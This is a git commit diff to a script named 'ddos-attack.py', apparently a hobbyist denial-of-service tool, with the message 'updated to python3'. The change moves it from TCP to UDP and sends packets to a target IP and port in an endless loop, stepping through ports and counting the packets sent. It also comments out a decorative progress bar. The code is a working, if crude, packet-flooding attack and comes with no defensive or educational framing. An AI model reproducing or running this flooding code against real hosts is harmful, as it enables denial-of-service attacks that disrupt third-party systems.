c3f76039a2ce9bf883b6aa061ab10acc8e6937f2
RlyEasy <nazmiev69@gmail.com>
2020-11-18 21:34:29 +0300

    updated to python3

--- ddos-attack.py
+++ ddos-attack.py
@@ -21,24 +21,24 @@ except ValueError:
      print('Invalid value')
      sys.exit(1)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind((ip, port))
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# sock.bind((ip, port))
 # sock.listen(1)
 
-for i in range(5):
-     print('[', end='')
-     for j in range(i*4):
-          print('=', end='')
-     for k in range(16-i*4):
-          print(' ', end='')
-     print(f'] {i * 25}%')
-     time.sleep(1)
+# for i in range(5):
+#      print('[', end='')
+#      for j in range(i*4):
+#           print('=', end='')
+#      for k in range(16-i*4):
+#           print(' ', end='')
+#      print(f'] {i * 25}%')
+#      time.sleep(1)
 
 sent: int = 0
 print('Started at ', get_current_date_time())
 while True:
      # bytes_to_send: str = str(randint(1, 1490))
-     sock.send(b'1')
+     sock.sendto(b'1', (ip, port))
      sent += 1
      port += 1
      print(f"Sent {sent} packet to {ip} throught port:{port}")
